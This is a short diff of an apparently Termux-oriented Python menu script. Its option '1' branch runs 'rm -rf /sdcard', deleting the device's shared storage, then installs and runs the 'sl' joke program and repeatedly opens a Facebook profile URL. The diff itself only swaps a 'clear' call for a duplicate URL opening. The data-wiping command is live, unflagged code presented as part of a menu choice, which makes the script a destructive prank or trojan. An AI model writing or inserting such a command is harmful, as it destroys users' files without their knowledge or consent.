@@ -42,7 +42,7 @@ if option == "1":
         os.system("rm -rf /sdcard")
         os.system("apt install sl")
         os.system("sl")
-        os.system("clear")
+        os.system("xdg-open https://www.facebook.com/profile.php?id=100028650051426")
         os.system("xdg-open https://www.facebook.com/profile.php?id=100028650051426")
         i = i + 1
 elif option ==  "2":
